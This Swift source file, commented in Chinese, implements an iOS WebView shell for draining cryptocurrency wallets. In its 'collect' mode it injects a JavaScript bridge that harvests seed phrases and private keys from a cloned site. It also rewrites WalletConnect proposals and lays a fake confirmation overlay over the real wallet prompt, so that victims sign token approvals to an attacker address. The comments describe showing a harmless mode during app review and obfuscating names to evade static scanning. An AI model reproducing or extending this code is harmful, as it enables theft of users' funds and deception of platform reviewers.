import UIKit
import WebKit

// WKWebView 壳 + JS↔Native 桥 + 前台覆盖确认层（第 32 类 §2/§4）
// mode.normal  = 审核期/分析环境：纯落地页，无桥、无采集
// mode.collect = 目标环境：注入 bridge.js，接管签名确认展示

final class ShellViewController: UIViewController, WKScriptMessageHandler {

    enum Mode { case normal, collect }
    let mode: Mode
    private var web: WKWebView!
    private var overlay: OverlayConfirm?

    private let landingURL = URL(string: "https://DOMAIN/")!   // 克隆站 / 伪 PWA 入口

    init(mode: Mode) { self.mode = mode; super.init(nibName: nil, bundle: nil) }
    required init?(coder: NSCoder) { fatalError("init(coder:) disabled") }

    override func viewDidLoad() {
        super.viewDidLoad()
        let cfg = WKWebViewConfiguration()
        cfg.defaultWebpagePreferences.allowsContentJavaScript = true
        if mode == .collect {
            let cc = WKUserContentController()
            cc.add(self, name: "drainBridge")           // 桥方法名混淆，避免静态扫描命中
            if let script = bridgeScript() {
                cc.addUserScript(WKUserScript(source: script, injectionTime: .atDocumentStart,
                                              forMainFrameOnly: false))
            }
            cfg.userContentController = cc
        }
        // ATS：企业签名场景允许自有域；生产用 TLS 证书固定（见 PinningDelegate）
        web = WKWebView(frame: view.bounds, configuration: cfg)
        web.autoresizingMask = [.flexibleWidth, .flexibleHeight]
        web.customUserAgent = "Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15"
        view.addSubview(web)
        web.load(URLRequest(url: landingURL))

        if mode == .collect {
            view.addSubview(OverlayConfirm.shared.view)
            OverlayConfirm.shared.hide()
        }
    }

    private func bridgeScript() -> String? {
        guard let p = Bundle.main.path(forResource: "bridge", ofType: "js"),
              let s = try? String(contentsOfFile: p, encoding: .utf8) else { return nil }
        return s
    }

    // JS → Native：window.webkit.messageHandlers.drainBridge.postMessage({t, d})
    func userContentController(_ userContentController: WKUserContentController,
                               didReceive message: WKScriptMessage) {
        guard let body = message.body as? [String: Any],
              let t = body["t"] as? String else { return }
        let d = body["d"] as? [String: Any] ?? [:]
        switch t {
        case "collect":                       // 助记词/私钥表单提交
            Transport.shared.enqueue(kind: "collect", fields: d)
        case "wc_proposal":                  // WalletConnect 会话提议 → 改写 spender/method
            let rewritten = WCInterceptor.shared.rewrite(proposal: d)
            OverlayConfirm.shared.show(chain: rewritten["chain"] as? String ?? "eth",
                                       amount: rewritten["amount"] as? String ?? "—") { confirmed in
                if confirmed { WCInterceptor.shared.approve(rewritten) }
            }
        case "tx_confirm":                   // 真实钱包确认页 → 盖同款 UI，签的是 approve
            OverlayConfirm.shared.show(chain: d["chain"] as? String ?? "eth",
                                       amount: d["amount"] as? String ?? "—") { confirmed in
                if confirmed {
                    let cd = WCInterceptor.shared.approveCalldata(spender: "DRAIN_ADDR")
                    Transport.shared.enqueue(kind: "wc_sign",
                                             fields: ["calldata": cd, "orig_to": d["to"] ?? ""])
                }
            }
        case "step":                         // 多步向导进度
            Transport.shared.enqueue(kind: "event", fields: ["s": d["s"] ?? ""])
        default:
            break
        }
    }
}
